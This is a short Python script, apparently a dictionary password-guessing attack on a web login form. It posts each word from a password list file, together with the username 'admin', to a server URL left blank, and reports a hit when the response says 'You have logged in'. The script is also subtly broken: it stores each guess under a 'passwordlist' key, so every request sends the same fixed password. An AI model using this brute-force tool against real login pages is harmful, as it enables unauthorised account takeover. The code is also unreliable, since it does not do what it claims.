from requests import post

server = ''
login_data = {"username":"admin", "password":"password"}

with open('pwordlist','r') as passwd:
    for line in passwd:
        word = line.strip()
        login_data["passwordlist"] = word
        req = post (server,data=login_data)
        if "You have logged in".encode() in req.content:
            print("[+] Password Found >>"+word)

        else:
            print("Password Not found")
